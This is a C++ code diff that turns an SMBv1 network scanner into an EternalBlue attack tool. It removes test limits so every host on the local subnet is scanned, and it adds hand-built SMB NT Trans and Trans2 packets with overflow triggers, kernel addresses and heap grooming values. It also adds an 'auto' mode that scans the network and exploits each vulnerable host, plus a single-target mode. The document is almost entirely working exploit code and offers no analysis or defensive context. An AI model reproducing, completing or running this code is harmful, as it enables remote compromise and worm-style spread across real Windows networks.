@@ -42,17 +42,10 @@ public:
         NetConfig config = AcquireNetworkConfig();
         std::vector<std::string> vulnerableHosts;
 
-        if (!config.network.empty()) {
-            std::cout << "[+] Acquired network: " << config.network << "/" << config.prefix
-                      << " (Local IP: " << config.localIP << ")" << std::endl;
-            scanned_count = 0;
-            target_count = 0;
-            config.network = "192.168.84.0";
-            config.prefix = 24;
-            vulnerableHosts = PerformScan(config);
-        } else {
-            std::cout << "[-] No valid network adapter found." << std::endl;
-        }
+        std::cout << "[+] Acquired network: " << config.network << "/" << config.prefix << " (Local IP: " << config.localIP << ")" << std::endl;
+        scanned_count = 0;
+        target_count = 0;
+        vulnerableHosts = PerformScan(config);
 
         return vulnerableHosts;
     }
@@ -110,16 +103,10 @@ private:
         std::vector<std::string> targets = GenerateTargets(config);
         std::vector<std::string> vulnerable;
 
-        std::cout << "[+] Scanning " << targets.size() << " potential targets..." << std::endl;
-
         for (const auto& target : targets) {
-            std::cout << "[*] Checking " << target << " ... ";
             if (CheckPort(target, 445)) {
-                std::cout << "SMBv1 VULNERABLE" << std::endl;
                 vulnerable.push_back(target);
                 target_count++;
-            } else {
-                std::cout << "SAFE" << std::endl;
             }
             scanned_count++;
             ApplyDelay();
@@ -137,10 +124,9 @@ private:
         if (total_hosts <= 0) return targets;
 
         std::vector<int> host_nums;
-        // for (int i = 1; i < total_hosts + 1; i++) { 
-        //     host_nums.push_back(i);
-        // }
-        host_nums.push_back(135);
+        for (int i = 1; i < total_hosts + 1; i++) { 
+            host_nums.push_back(i);
+        }
 
         std::random_device rd;
         std::mt19937 g(rd());
@@ -215,7 +201,6 @@ private:
             return false;
         }
 
-        // Tạo Negotiate packet chỉ có dialect cũ
         std::vector<uint8_t> packet;
         packet.insert(packet.end(), {0x00, 0x00, 0x00, 0x00}); // NetBIOS length
 
@@ -254,7 +239,6 @@ private:
         packet.push_back((byte_count >> 8) & 0xFF);
         packet.insert(packet.end(), dialect_bytes.begin(), dialect_bytes.end());
 
-        // Cập nhật NetBIOS length
         uint32_t netbios_len = packet.size() - 4;
         packet[0] = 0x00;
         packet[1] = 0x00;
@@ -270,24 +254,14 @@ private:
         int received = recv(sock, (char*)buffer, sizeof(buffer), 0);
         closesocket(sock);
 
-        if (received <= 0) return false;
-
-        std::cout << "Received " << received << " bytes" << std::endl;
-        std::cout << "Response hex:\n" << bytes_to_hex(buffer, received) << std::endl;
-
         if (received < 10) return false;
         if (buffer[4] != 0xFF || buffer[5] != 'S' || buffer[6] != 'M' || buffer[7] != 'B' || buffer[8] != 0x72) {
             return false;
         }
 
-        // ĐỌC DIALECT INDEX Ở OFFSET 9
         int dialect_index = buffer[9];
-        std::cout << "Dialect index: " << dialect_index << std::endl;
 
-        if (dialect_index <= 5) {
-            std::cout << "SMBv1 DETECTED (Dialect: " << dialect_index << ")" << std::endl;
-            return true;
-        }
+        if (dialect_index <= 5) return true;
 
         return false;
     }
@@ -325,16 +299,23 @@ private:
 
 class EternalBlue {
 private:
+    std::string targetIP;
+    SOCKET sock = INVALID_SOCKET;
+    
+    enum class ExploitType {
+        TRANS2_BUFFER,
+        TRANS2_ZERO, 
+        TRANS2_EXPLOIT
+    };
+    
     unsigned char smbNegotiate[137];
     unsigned char sessionSetup[140];
     unsigned char treeConnectRequest[100];
-
-    unsigned char userID[2] = {0};
-    unsigned char treeID[2];
+    unsigned char userID[2] = {0, 0};       
+    unsigned char treeID[2] = {0, 0};    
     
-    std::string targetIP;
-    SOCKET sock = INVALID_SOCKET;
-
+    int groomCount = 15;
+    int groomDelta = 5;
 public:
     EternalBlue() {
         InitializePackets();
@@ -344,7 +325,7 @@ public:
         if (sock != INVALID_SOCKET) closesocket(sock);
     }
 
-    bool StartExploit(const std::string& host) {
+    bool Exploit(const std::string& host) {
         targetIP = host;
         std::cout << "[*] Target: " << host << "\n\n";
 
@@ -353,7 +334,11 @@ public:
         if (!DoSessionSetup()) return false;
         if (!SendTreeConnect()) return false;
         
-        std::cout << "[+] Target appears vulnerable to EternalBlue!\n";
+        if (!SendNTLargeBuffer()) {
+            std::cout << "[-] NT Trans Large Buffer failed\n";
+            return false;
+        }
+        
         return true;
     }
 
@@ -492,31 +477,241 @@ private:
 
         return true;
     }
+
+    std::vector<uint8_t> MakeSMB1NTTransPacket() {
+        std::vector<uint8_t> packet;
+        
+        // NetBIOS header
+        packet.insert(packet.end(), {0x00, 0x00, 0x00, 0x00});
+        
+        // SMB Header (32 bytes)
+        packet.insert(packet.end(), {
+            0xFF, 0x53, 0x4D, 0x42,                             // SMB signature
+            0xA0,                                               // Command
+            0x00, 0x00, 0x00, 0x00,                             // Status
+            0x18,                                               // Flags
+            0x07, 0xC0,                                         // Flags2
+            0x00, 0x00,                                         // PID High
+            0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,     // SecurityFeatures
+            0x00, 0x00, 
+            treeID[0], treeID[1],                               // Tree ID
+            0xFF, 0xFE,                                         // Process ID
+            userID[0], userID[1],                               // User ID
+            0x40, 0x00,                                         // MID
+        });
+        
+        // SMB Parameters
+        packet.insert(packet.end(), {
+            0x14,                           // WordCount
+            0x01,                           // MaxSetupCount
+            0x00, 0x00,                     // Reserved1
+            0x1E, 0x00, 0x00, 0x00,         // TotalParameterCount
+            0xD0, 0x03, 0x01, 0x00,         // TotalDataCount
+            0x1E, 0x00, 0x00, 0x00,         // MaxParameterCount
+            0x00, 0x00, 0x00, 0x00,         // MaxDataCount
+            0x1E, 0x00, 0x00, 0x00,         // ParameterCount
+            0x4B, 0x00, 0x00, 0x00,         // ParameterOffset
+            0xD0, 0x03, 0x00, 0x00,         // DataCount
+            0x68, 0x00, 0x00, 0x00,         // DataOffset
+            0x01,                           // SetupCount
+            0x00, 0x00,                     // Function
+            0x00, 0x00,                     // Setup
+        });
+        
+        // SMB Data
+        packet.insert(packet.end(), {
+            0xEC, 0x03,                     // Byte Count
+            0x00,                           // Padding
+        });
+        
+        packet.insert(packet.end(), 30, 0x00);
+        packet.insert(packet.end(), {0x01});
+        packet.insert(packet.end(), 973, 0x00);
+        
+        uint32_t netbios_len = packet.size() - 4;
+        packet[0] = 0x00;
+        packet[1] = 0x00;
+        packet[2] = (netbios_len >> 8) & 0xFF;
+        packet[3] = netbios_len & 0xFF;
+        
+        return packet;
+    }
+
+    std::vector<uint8_t> MakeSMB1Trans2ExploitPacket(ExploitType type, uint8_t timeout) {
+        std::vector<uint8_t> pkt;
+    
+        // Calculate timeout value (timeout * 0x10 + 3)
+        uint8_t calculated_timeout = (timeout * 0x10) + 3;
+        
+        // NetBIOS Session Service header (4 bytes)
+        pkt.insert(pkt.end(), {0x00, 0x00, 0x00, 0x00}); // Placeholder for length
+        
+        // SMB Header (32 bytes)
+        pkt.insert(pkt.end(), {
+            0xFF, 'S', 'M', 'B',                         // SMB signature
+            0x33,                                        // Command: SMB_COM_TRANSACTION2_SECONDARY (0x32)
+            0x00, 0x00, 0x00, 0x00,                      // Status
+            0x18,                                        // Flags
+            0x07, 0xC0,                                  // Flags2
+            0x00, 0x00,                                  // PID High
+            0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, // SecurityFeatures
+            0x00, 0x00, 
+            treeID[0], treeID[1],                        // Tree ID
+            0xFF, 0xFE,                                  // Process ID 
+            userID[0], userID[1],                        // User ID
+            0x40, 0x00,                                  // Multiplex ID
+        });
+        
+        // SMB_Parameters
+        pkt.insert(pkt.end(), {
+            0x09,                                       // WordCount
+        });
+        
+        pkt.insert(pkt.end(), {
+            0x00, 0x00,                             // TotalParameterCount = 0
+            0x00, 0x10,                             // TotalDataCount = 4096
+            0x00, 0x00,                             // MaxParameterCount = 0
+            0x00, 0x00,                             // MaxDataCount = 0
+            0x00,                                   // MaxSetupCount = 0
+            0x00,                                   // Reserved1
+            0x00, 0x10,                             // Flags
+            0x35, 0x00, 0xD0, calculated_timeout,   // Timeout
+            0x00, 0x00,                             // Reserved2
+        });
+        
+        // ParameterCount = 4096, ParameterOffset 
+        pkt.insert(pkt.end(), {0x00, 0x10, 0x00, 0x00});
+        // DataCount DataOffset
+        pkt.insert(pkt.end(), {0x00, 0x00, 0x00, 0x00});
+        // DataDisplacement 
+        pkt.insert(pkt.end(), {0x00, 0x00});
+        // SetupCount 
+        pkt.insert(pkt.end(), {0x00});
+        // ByteCount
+        pkt.insert(pkt.end(), {0x00, 0x00});
+        
+        std::vector<uint8_t> data_section;
+        
+        switch (type) {
+            case ExploitType::TRANS2_EXPLOIT: {
+                data_section.insert(data_section.end(), 2957, 0x41);
+                data_section.insert(data_section.end(), {0x80, 0x00, 0xA8, 0x00}); // overflow trigger
+                data_section.insert(data_section.end(), 0x10, 0x00);  // 16 zeros
+                data_section.insert(data_section.end(), {0xFF, 0xFF}); // 0xFFFF
+                data_section.insert(data_section.end(), 0x6, 0x00);   // 6 zeros  
+                data_section.insert(data_section.end(), {0xFF, 0xFF}); // 0xFFFF
+                data_section.insert(data_section.end(), 0x16, 0x00);  // 22 zeros
+                data_section.insert(data_section.end(), {0x00, 0xF1, 0xDF, 0xFF}); // x86 address 1
+                data_section.insert(data_section.end(), 0x8, 0x00);   // 8 zeros
+                data_section.insert(data_section.end(), {0x20, 0xF0, 0xDF, 0xFF}); // x86 address 2
+                data_section.insert(data_section.end(), {0x00, 0xF1, 0xDF, 0xFF, 0xFF, 0xFF, 0xFF, 0xFF}); // x64 address
+                data_section.insert(data_section.end(), {0x60, 0x00, 0x04, 0x10}); // data
+                data_section.insert(data_section.end(), 4, 0x00);     // 4 zeros
+                data_section.insert(data_section.end(), {0x80, 0xEF, 0xDF, 0xFF}); // address
+                data_section.insert(data_section.end(), 4, 0x00);     // 4 zeros
+                data_section.insert(data_section.end(), {0x10, 0x00, 0xD0, 0xFF, 0xFF, 0xFF, 0xFF, 0xFF}); // x64 address 2
+                data_section.insert(data_section.end(), {0x18, 0x01, 0xD0, 0xFF, 0xFF, 0xFF, 0xFF, 0xFF}); // x64 address 3
+                data_section.insert(data_section.end(), 0x10, 0x00);  // 16 zeros
+                data_section.insert(data_section.end(), {0x60, 0x00, 0x04, 0x10}); // data
+                data_section.insert(data_section.end(), 0xC, 0x00);   // 12 zeros
+                data_section.insert(data_section.end(), {0x90, 0xFF, 0xCF, 0xFF, 0xFF, 0xFF, 0xFF, 0xFF}); // x64 address 4
+                data_section.insert(data_section.end(), 0x8, 0x00);   // 8 zeros
+                data_section.insert(data_section.end(), {0x80, 0x10}); // data
+                data_section.insert(data_section.end(), 0xE, 0x00);   // 14 zeros
+                data_section.insert(data_section.end(), {0x39, 0xBB}); // magic bytes
+                data_section.insert(data_section.end(), 965, 0x41);   // 965 bytes of 'A'
+                break;
+            }
+            
+            case ExploitType::TRANS2_ZERO: {
+                std::cout << "[*] Making TRANS2_ZERO packet\n";
+                data_section.insert(data_section.end(), 2055, 0x00);  
+                data_section.insert(data_section.end(), {0x83, 0xF3}); 
+                data_section.insert(data_section.end(), 2039, 0x41); 
+                break;
+            }
+            
+            case ExploitType::TRANS2_BUFFER: {
+                data_section.insert(data_section.end(), 4096, 0x41); 
+                break;
+            }
+        }
+        
+        // Add data section to packet
+        pkt.insert(pkt.end(), data_section.begin(), data_section.end());
+        
+        // Update NetBIOS length
+        uint32_t netbios_len = pkt.size() - 4;
+        pkt[0] = 0x00;
+        pkt[1] = 0x00;
+        pkt[2] = (netbios_len >> 8) & 0xFF;
+        pkt[3] = netbios_len & 0xFF;
+        
+        return pkt;
+    }
+
+    bool SendNTLargeBuffer() {
+        auto nt_trans_pkt = MakeSMB1NTTransPacket();
+
+        if (!Send(nt_trans_pkt.data(), nt_trans_pkt.size())) {
+            return false;
+        }
+        
+        unsigned char resp[1024];
+        Recv(resp, sizeof(resp));
+        
+        std::vector<uint8_t> all_packets;
+        
+        auto trans2_zero_pkt = MakeSMB1Trans2ExploitPacket(ExploitType::TRANS2_ZERO, 0);
+        all_packets.insert(all_packets.end(), trans2_zero_pkt.begin(), trans2_zero_pkt.end());
+        
+        std::cout << bytes_to_hex(trans2_zero_pkt.data(), trans2_zero_pkt.size()) << "\n";
+
+        return true;
+    }
+
 };
 
 class Attack {
 public:
-    static void Launch() {
+    static void LaunchAuto() {
         auto targets = NetworkRecon::Execute();
+        if (targets.empty()) return;
+
         EternalBlue exploit;
         for (const auto& t : targets) {
-            exploit.StartExploit(t);
+            exploit.Exploit(t);
         }
+    }
+
+    static void LaunchSingle(const std::string& ip) {
+        EternalBlue exploit;
+        exploit.Exploit(ip);
     }
 };
 
-// === Static init ===
+void ShowUsage(const char* programName) {
+    std::cout << "Usage:\n";
+    std::cout << "  " << programName << " auto                    - Scan and exploit all vulnerable hosts in network\n";
+    std::cout << "  " << programName << " <IP_ADDRESS>            - Exploit specific IP address\n";
+}
+
 std::atomic<int> NetworkRecon::scanned_count(0);
 std::atomic<int> NetworkRecon::target_count(0);
 
-int main() {
+int main(int argc, char* argv[]) {
     WSADATA wsa;
-    if (WSAStartup(MAKEWORD(2, 2), &wsa) != 0) {
-        std::cout << "[-] WSAStartup failed\n";
-        return 1;
-    }
-
-    Attack::Launch();
+    if (WSAStartup(MAKEWORD(2, 2), &wsa) != 0) return 1;
+    
+    if (argc == 2) {
+        std::string option = argv[1];
+        
+        if (option == "auto") 
+            Attack::LaunchAuto();
+        else 
+            Attack::LaunchSingle(option);
+    } 
+    else ShowUsage(argv[0]);
 
     WSACleanup();
     return 0;
